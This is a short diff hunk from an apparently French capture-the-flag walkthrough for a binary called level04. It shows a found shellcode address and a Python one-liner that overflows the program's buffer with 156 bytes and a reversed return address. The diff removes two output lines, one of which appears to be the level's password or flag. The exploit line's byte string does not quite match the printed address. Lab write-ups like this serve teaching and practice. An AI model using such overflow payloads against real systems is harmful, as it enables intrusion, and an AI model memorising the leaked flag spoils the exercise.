@@ -36,5 +36,3 @@ Grace à un petit programme on va retrouver l'adresse de notre shellcode pour l'
 0xffffd910
 
 python -c "print 156 * 'A' + '\xff\xff\xd9\xb10'[::-1]" | ./level04
-3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
-child is exiting...
